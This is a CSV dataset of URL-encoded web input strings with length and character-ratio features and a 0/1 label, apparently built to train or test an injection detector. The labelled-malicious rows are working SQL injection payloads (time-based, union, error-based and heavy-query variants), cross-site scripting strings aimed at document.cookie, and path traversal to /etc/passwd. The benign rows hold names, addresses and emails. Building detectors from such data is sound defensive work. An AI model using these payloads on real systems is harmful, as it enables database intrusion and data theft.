payload,payload_len,alpha,non_alpha,attack_feature,label
1%27%7C%7C%28select%20%27kgfu%27%20from%20dual%20where%202607%3D2607%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,140,85.71428571428571,14.285714285714285,120000.0,1
hau,3,100.0,0.0,0.0,0
11112430a,9,100.0,0.0,0.0,0
-9352%22%29%29%29%20or%203038%3D3038,22,72.72727272727273,27.27272727272727,30000.0,1
63734935a,9,100.0,0.0,0.0,0
juan%20de%20grijalba%2C%2023,20,100.0,0.0,0.0,0
tirapu,6,100.0,0.0,0.0,0
7092,4,100.0,0.0,0.0,0
8.04948E+15,16,68.75,31.25,45.45454545454545,0
1%27%29%29%3Bbegin%20user_lock.sleep%285%29%3B%20end%20and%20%28%28%27zlsq%27%3D%27zlsq,53,71.69811320754717,28.30188679245283,30000.0,1
-7139%22%29%20where%202723%3D2723%20or%203900%3D5082--,38,81.57894736842105,18.421052631578945,60000.0,1
-6846%25%22%29%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%28%22%25%22%3D%22,41,60.97560975609756,39.02439024390244,60000.0,1
1%27%7C%7C%28select%20%27sbft%27%20where%208748%3D8748%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,131,84.7328244274809,15.267175572519085,60000.0,1
baquet0,7,100.0,0.0,0.0,0
1%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--%20kegk,69,78.26086956521739,21.73913043478261,39000.0,1
1%22%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%22oyuj%22%3D%22oyuj,122,78.68852459016394,20.491803278688526,90000.0,1
1%29%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual,84,73.80952380952381,26.190476190476193,30000.0,1
-4541%22%29%29%20or%20make_set%284821%3D5233%2C5233%29%20and%20%28%28%22xfex%22%3D%22xfex,55,72.72727272727273,27.27272727272727,60000.0,1
sant%20pere%20pescador,18,100.0,0.0,0.0,0
1%25%22%29%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,65,75.38461538461539,24.615384615384617,60000.0,1
pericak,7,100.0,0.0,0.0,0
1%27%29%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual%20and%20%28%27hmsu%27%3D%27hmsu,103,72.81553398058253,27.184466019417474,60000.0,1
jana,4,100.0,0.0,0.0,0
jubinvil,8,100.0,0.0,0.0,0
1%22%29%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%28%22poik%22%3D%22poik,63,79.36507936507937,20.634920634920633,30000.0,1
-6020%27%2B%28select%20isrz%20where%202489%3D2489%20union%20all%20select%202489%2C2489%2C2489%2C2489%2C2489%2C2489%2C2489%2C2489--,94,85.1063829787234,14.893617021276595,90000.0,1
1%29%29%20as%20lkqx%20where%206468%3D6468%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,70,81.42857142857143,18.571428571428573,90000.0,1
tolosa%20fontanet,15,100.0,0.0,0.0,0
1%22%29%20where%204849%3D4849%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,79,81.0126582278481,18.9873417721519,90000.0,1
-2849%27%20union%20all%20select%206491%2C6491%2C6491%2C6491%2C6491%2C6491%2C6491--,60,83.33333333333334,16.666666666666664,60000.0,1
3.71442E+15,16,68.75,31.25,45.45454545454545,0
cukera,6,100.0,0.0,0.0,0
8.65216E+15,16,68.75,31.25,45.45454545454545,0
cobo,4,100.0,0.0,0.0,0
pons%20anguita,12,100.0,0.0,0.0,0
6.44187E+14,16,68.75,31.25,45.45454545454545,0
licia,5,100.0,0.0,0.0,0
1%29%29%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%284450%3D4450,78,80.76923076923077,19.230769230769234,90000.0,1
stokoski,8,100.0,0.0,0.0,0
1%25%27%29%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%27%25%27%3D%27,211,69.66824644549763,30.33175355450237,90000.0,1
blasinda,8,100.0,0.0,0.0,0
3.12801E+15,16,68.75,31.25,45.45454545454545,0
tewksbur,8,100.0,0.0,0.0,0
-8410%27%29%29%29%20or%208571%3D8571--,24,66.66666666666666,33.33333333333333,30000.0,1
carraleja,9,100.0,0.0,0.0,0
sunderla,8,100.0,0.0,0.0,0
malmirada,9,100.0,0.0,0.0,0
09840824k,9,100.0,0.0,0.0,0
alexine,7,100.0,0.0,0.0,0
-3513%25%22%20union%20all%20select%208473%2C8473%23,35,85.71428571428571,14.285714285714285,60000.0,1
howlett,7,100.0,0.0,0.0,0
pedrosas%2C%20las,13,100.0,0.0,0.0,0
/......................................................................................................................................................................%7Bfile%7D,173,98.84393063583815,1.1560693641618514,1.1695906432748555,1
1%20where%208578%3D8578%20and%204770%3D4474--,33,87.87878787878788,12.121212121212121,60000.0,1
bow%40whitepearlresort.pl,23,100.0,0.0,0.0,0
1%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,90,82.22222222222221,17.77777777777778,30000.0,1
1%27%29%29%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,102,83.33333333333334,16.666666666666664,30000.0,1
campa%20zabala%20184%2C,17,100.0,0.0,0.0,0
ansorger,8,100.0,0.0,0.0,0
1%29%20where%205550%3D5550%20%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29--,207,80.67632850241546,19.32367149758454,60000.0,1
-3997%27%2B%28select%20%27avjk%27%20where%201917%3D1917%20union%20all%20select%201917%2C1917%2C1917--,71,84.50704225352112,15.492957746478872,90000.0,1
1%25%22%29%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,142,69.01408450704226,30.985915492957744,30000.0,1
1%27%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%28%27hmtt%27%20like%20%27hmtt,56,78.57142857142857,21.428571428571427,60000.0,1
bees3,5,100.0,0.0,0.0,0
lamentante,10,100.0,0.0,0.0,0
1%25%27%29%29%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,146,69.17808219178082,30.82191780821918,30000.0,1
1%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29,44,77.27272727272727,22.727272727272727,60000.0,1
4.4228E+15,16,62.5,37.5,60.0,0
1%29%20as%20ptxw%20where%209873%3D9873%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,58,82.75862068965517,17.24137931034483,30000.0,1
rocco-misaki%40soybueno.nz,24,100.0,0.0,0.0,0
1%25%27%29%3Bselect%20benchmark%285000000%2Cmd5%280x714e4153%29%29%23,47,80.85106382978722,19.148936170212778,23.68421052631581,1
1%27%7C%7C%28select%20%27ukfj%27%20where%207133%3D7133%20union%20all%20select%20null%2Cnull%2Cnull%23,67,85.07462686567165,14.925373134328357,90000.0,1
34514395c,9,100.0,0.0,0.0,0
alobras,7,100.0,0.0,0.0,0
43785,5,100.0,0.0,0.0,0
1%25%27%29%29%20and%203721%3D2597%23,20,70.0,30.0,30000.0,1
minardi%20cardea,14,100.0,0.0,0.0,0
1%27%29%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29,189,79.8941798941799,20.105820105820104,30000.0,1
piejo,5,100.0,0.0,0.0,0
1%22%29%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,49,75.51020408163265,24.489795918367346,30000.0,1
dehaven_carollo%40muycurioso.lk,29,100.0,0.0,0.0,0
77447105x,9,100.0,0.0,0.0,0
coyne-rabasa%40intercambioenlaces.do,34,100.0,0.0,0.0,0
mieza,5,100.0,0.0,0.0,0
1%27%29%3Bselect%20pg_sleep%285%29%20and%20%28%27itgc%27%3D%27itgc,40,72.5,27.500000000000004,30000.0,1
ramiro%20de%20maeztu%2C%20s/n%208c,24,100.0,0.0,0.0,0
96622444l,9,100.0,0.0,0.0,0
pawlikowski%40clo2.tw,19,100.0,0.0,0.0,0
-8684%20union%20all%20select%209519%2C9519%2C9519%2C9519--,44,86.36363636363636,13.636363636363635,60000.0,1
quebrantamiento,15,100.0,0.0,0.0,0
koock%40aridossanchez.mt,22,100.0,0.0,0.0,0
clarabel,8,100.0,0.0,0.0,0
myhers%40wave.com.so,18,100.0,0.0,0.0,0
1%29%20where%207956%3D7956%20or%20sleep%285%29%23,31,83.87096774193549,16.129032258064516,60000.0,1
1%29%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%282868%3D2868,213,72.76995305164318,27.230046948356808,90000.0,1
tarsky,6,100.0,0.0,0.0,0
rogan-darrieux%40rocofer.tc,25,100.0,0.0,0.0,0
calle%20jabera%2C%2027%2C,17,100.0,0.0,0.0,0
pl.%20juan%20xxiii%20197,18,100.0,0.0,0.0,0
dungan,6,100.0,0.0,0.0,0
5.93691E+15,16,68.75,31.25,45.45454545454545,0
cami%20de%20almoster%2C%20109%2C,22,100.0,0.0,0.0,0
1%25%22%29%29%3Bselect%20case%20when%205308%3D6745%20then%201%20else%20null%20end--,55,90.9090909090909,9.090909090909093,10.000000000000004,1
1%27%29%20as%20llug%20where%202244%3D2244%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--,210,76.19047619047619,23.809523809523807,60000.0,1
6188,4,100.0,0.0,0.0,0
1%27%2B%28select%20nvht%20where%209118%3D9118%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%29%2B%27,134,86.56716417910447,13.432835820895523,90000.0,1
-8929%27%20union%20all%20select%205324%2C5324%2C5324%2C5324%2C5324%2C5324--,55,83.63636363636363,16.363636363636363,60000.0,1
perpetuo,8,100.0,0.0,0.0,0
1%22%29%29%20as%20spvl%20where%202242%3D2242%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29--,69,82.6086956521739,17.391304347826086,90000.0,1
1%20where%204940%3D4940%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29--,85,81.17647058823529,18.823529411764707,30000.0,1
1%27%20where%202673%3D2673%3Bselect%20%28case%20when%20%282716%3D8138%29%20then%202716%20else%202716%2A%28select%202716%20from%20mysql.db%29%20end%29%23,102,87.25490196078431,12.745098039215685,60000.0,1
1%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,61,83.60655737704919,16.39344262295082,60000.0,1
1%27%29%29%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%28%28%27xuwl%27%20like%20%27xuwl,132,73.48484848484848,26.515151515151516,90000.0,1
1.31469E+14,16,68.75,31.25,45.45454545454545,0
fulgencia,9,100.0,0.0,0.0,0
ming-yua,8,100.0,0.0,0.0,0
/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/%7Bfile%7D,43,95.34883720930233,4.6511627906976685,4.8780487804877986,1
parnell,7,100.0,0.0,0.0,0
8.34964E+15,16,68.75,31.25,45.45454545454545,0
tutusaus%20tenza,14,100.0,0.0,0.0,0
%28select%20%28case%20when%20%284232%3D4232%29%20then%20%28select%20benchmark%285000000%2Cmd5%280x6b637544%29%29%29%20else%204232%2A%28select%204232%20from%20mysql.db%29%20end%29%29,123,85.36585365853658,14.634146341463413,30000.0,1
-1765%27%29%20order%20by%201--,20,75.0,25.0,30000.0,1
65658514t,9,100.0,0.0,0.0,0
begley,6,100.0,0.0,0.0,0
pins%20turrubiartes,17,100.0,0.0,0.0,0
villaeles%20de%20valdavia,21,100.0,0.0,0.0,0
c/%20alcorac%2C%20102,15,100.0,0.0,0.0,0
mitjans,7,100.0,0.0,0.0,0
-7941%25%27%29%20union%20all%20select%206965%2C6965%2C6965%2C6965--,47,80.85106382978722,19.148936170212767,60000.0,1
nuestra%20seora%20de%20la%20paz%2C%2086%2C%202%3Fa,32,100.0,0.0,0.0,0
sempronia,9,100.0,0.0,0.0,0
1%27%29%20as%20tsge%20where%206970%3D6970%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,77,83.11688311688312,16.883116883116884,60000.0,1
1%27%29%29%20as%20njop%20where%207001%3D7001%3Bbegin%20user_lock.sleep%285%29%3B%20end--,60,80.0,20.0,30000.0,1
castrillo%20matajudos,19,100.0,0.0,0.0,0
varadero%2068%2C%208-c,16,100.0,0.0,0.0,0
5.25874E+15,16,68.75,31.25,45.45454545454545,0
1%22%29%29%20as%20vigs%20where%206175%3D6175%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--,185,82.16216216216216,17.83783783783784,90000.0,1
kunecke,7,100.0,0.0,0.0,0
-6067%27%2B%28select%20%27bfhf%27%20where%203114%3D3114%20union%20all%20select%203114%2C3114%2C3114%2C3114%2C3114%2C3114%2C3114%2C3114--,96,83.33333333333334,16.666666666666664,90000.0,1
1%25%27%29%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%28%28%27%25%27%3D%27,204,67.15686274509804,32.84313725490196,60000.0,1
correnta,8,100.0,0.0,0.0,0
sebastian_ferdi%40tintaultravioleta.mv,36,100.0,0.0,0.0,0
romaguer,8,100.0,0.0,0.0,0
1%27%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%27inec%27%3D%27inec,80,75.0,25.0,39000.0,1
3.16361E+15,16,68.75,31.25,45.45454545454545,0
8275,4,100.0,0.0,0.0,0
12796200n,9,100.0,0.0,0.0,0
1%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,43,81.3953488372093,18.6046511627907,60000.0,1
5.97528E+15,16,68.75,31.25,45.45454545454545,0
58c058ars4,10,100.0,0.0,0.0,0
-8963%29%20where%208528%3D8528%20or%20%282470%3D3271%29%2A3271--,44,79.54545454545455,20.454545454545457,60000.0,1
-1021%29%20as%20erjh%20where%207845%3D7845%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20en,234,56.41025641025641,14.957264957264957,60000.0,1
22487,5,100.0,0.0,0.0,0
botosso%40mytanga.cf,18,100.0,0.0,0.0,0
gasull%20vadell,13,100.0,0.0,0.0,0
%3Cimg%20low%20id%3Dxss%20src%3D%22javascript%3Aalert%28%27xss%27%29%22%3E,46,76.08695652173914,23.91304347826087,30000.0,1
-9941%20union%20all%20select%201321%2C1321%2C1321%2C1321%2C1321%2C1321%2C1321%23,58,86.20689655172413,13.793103448275861,60000.0,1
1%27%2B%28select%20%27qbdh%27%20where%204006%3D4006%20and%207533%3D7533%29%2B%27,50,80.0,20.0,60000.0,1
arrobador,9,100.0,0.0,0.0,0
48310,5,100.0,0.0,0.0,0
1%27%29%29%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%20and%20%28%28%27uyft%27%3D%27uyft,138,81.15942028985508,18.84057971014493,90000.0,1
puebla%20de%20la%20sierra,19,100.0,0.0,0.0,0
1%25%22%29%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29%20and%20%28%22%25%22%3D%22,107,75.70093457943925,24.299065420560748,60000.0,1
1%29%29%20as%20xroy%20where%203274%3D3274%3Biif%283760%3D4785%2C1%2C1/0%29,48,79.16666666666666,20.833333333333336,30000.0,1
cane%40meneamex.br,16,100.0,0.0,0.0,0
92269883r,9,100.0,0.0,0.0,0
-1%3Cdiv%20style%3D%22width%3A%20expression%28document.cookie%3Dtrue%29%3B%22%3E,56,78.57142857142857,21.428571428571427,60000.0,1
c/%20almenas%2098%205%3Ff,17,100.0,0.0,0.0,0
lundigan%403horas.gob,19,100.0,0.0,0.0,0
san%20ildefonso,13,100.0,0.0,0.0,0
1%29%29%3Bif%282643%3D1393%29%20select%202643%20else%20drop%20function%20nqss--,55,85.45454545454545,14.545454545454545,60000.0,1
1%29%29%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,89,84.26966292134831,15.730337078651685,30000.0,1
farid,5,100.0,0.0,0.0,0
1%29%29%29%20procedure%20analyse%28extractvalue%289627%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x4b774c75%29%29%29%29%29%2C1%29%23,95,83.15789473684211,16.84210526315789,20.25316455696202,1
cendejas%20de%20la%20torre,20,100.0,0.0,0.0,0
adamson,7,100.0,0.0,0.0,0
guango,6,100.0,0.0,0.0,0
-1exp/%2A%3Ca%20style%3D%27no%5C%5Ccrosssitescripting%3Anocrosssitescripting%28%22%2A//%2A%22%29%3Bcrosssitescripting%3Aex/%2Acrosssitescripting%2A//%2A/%2A/pression%28document.cookie%3Dtrue%29%27%3E,148,77.7027027027027,21.62162162162162,60000.0,1
torreblascopedro,16,100.0,0.0,0.0,0
8.25101E+15,16,68.75,31.25,45.45454545454545,0
1%27%20and%206510%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%27eqle%27%3D%27eqle,170,90.0,10.0,90000.0,1
6i97s9r02t1,11,100.0,0.0,0.0,0
74779691k,9,100.0,0.0,0.0,0
1%29%20where%202473%3D2473%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29--,112,81.25,18.75,60000.0,1
6.50345E+15,16,68.75,31.25,45.45454545454545,0
alcntar,7,100.0,0.0,0.0,0
1%25%22%29%20or%207427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29--,80,67.5,32.5,30000.0,1
1%27%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%27hcpo%27%20like%20%27hcpo,209,74.64114832535886,25.358851674641148,90000.0,1
de%20jaime,8,100.0,0.0,0.0,0
segundo,7,100.0,0.0,0.0,0
8.65155E+15,16,68.75,31.25,45.45454545454545,0
neils,5,100.0,0.0,0.0,0
xerta,5,100.0,0.0,0.0,0
1%25%22%29%29%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,38,76.31578947368422,23.68421052631578,31.034482758620673,1
cenobia,7,100.0,0.0,0.0,0
%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cdiv%20style%3D%221%40gmail.com,62,79.03225806451613,20.967741935483872,60000.0,1
baye,4,100.0,0.0,0.0,0
%3Cimg%20src%3Djavascript%3Aalert%28%22crosssitescripting%22%29%3E,48,83.33333333333334,16.666666666666664,30000.0,1
1%27%29%20as%20pogx%20where%204105%3D4105%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29--,216,71.75925925925925,28.240740740740737,60000.0,1
estellesa,9,100.0,0.0,0.0,0
1%27%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%27lwlh%27%3D%27lwlh,191,81.15183246073299,18.848167539267017,90000.0,1
cruttenden%40saludyfitness.ca,27,100.0,0.0,0.0,0
63897551d,9,100.0,0.0,0.0,0
20542773r,9,100.0,0.0,0.0,0
c/%20maria%20zayas%20de%20sotomayor%2018,30,100.0,0.0,0.0,0
1%22%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,88,85.22727272727273,14.772727272727273,30000.0,1
1%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%23%20kfza,112,87.5,12.5,60000.0,1
/....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd,83,10.843373493975903,89.1566265060241,30000.0,1
6.79619E+15,16,68.75,31.25,45.45454545454545,0
dotan,5,100.0,0.0,0.0,0
9.18406E+15,16,68.75,31.25,45.45454545454545,0
1%2C%28select%20%28case%20when%20%287616%3D7616%29%20then%201%20else%201/%28select%200%29%20end%29%29,63,87.3015873015873,12.698412698412696,14.545454545454541,1
gareth,6,100.0,0.0,0.0,0
calle%20campo%20charro%2C%2089%2C,23,100.0,0.0,0.0,0
c/%20virgen%20de%20la%20almudena%2C%2061%2012%3Fc,33,100.0,0.0,0.0,0
torre-pacheco,13,100.0,0.0,0.0,0
cohn.of%40evasor.ch,17,100.0,0.0,0.0,0
7.80256E+15,16,68.75,31.25,45.45454545454545,0
7stambrar,9,100.0,0.0,0.0,0
8.75573E+15,16,68.75,31.25,45.45454545454545,0
monsalve%20almada,15,100.0,0.0,0.0,0
ta-sung,7,100.0,0.0,0.0,0
1%27%20in%20boolean%20mode%29%3Bselect%20sleep%285%29%23,36,83.33333333333334,16.666666666666657,19.999999999999986,1
renata,6,100.0,0.0,0.0,0
kara-lyn,8,100.0,0.0,0.0,0
sant%20jordi/san%20jorge,20,100.0,0.0,0.0,0
c/%20la%20hortensia%2C%20s/n,20,100.0,0.0,0.0,0
bansal,6,100.0,0.0,0.0,0
1%25%22%29%29%20and%206283%3D2068%20and%20%28%28%22%25%22%3D%22,31,61.29032258064516,38.70967741935484,60000.0,1
42120,5,100.0,0.0,0.0,0
1%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%281473%3D1473,112,87.5,12.5,60000.0,1
1%22%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,57,82.45614035087719,17.543859649122805,60000.0,1
1%25%27%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%28%27%25%27%3D%27,105,82.85714285714286,17.142857142857142,60000.0,1
1%22%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%22buzb%22%3D%22buzb,218,72.93577981651376,27.06422018348624,90000.0,1
b9s37ac1,8,100.0,0.0,0.0,0
arditi-alexis%40capitalinvest.vc,30,100.0,0.0,0.0,0
pajo,4,100.0,0.0,0.0,0
pintarrajar,11,100.0,0.0,0.0,0
1%27%20in%20boolean%20mode%29%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,81,79.01234567901234,20.98765432098765,39000.0,1
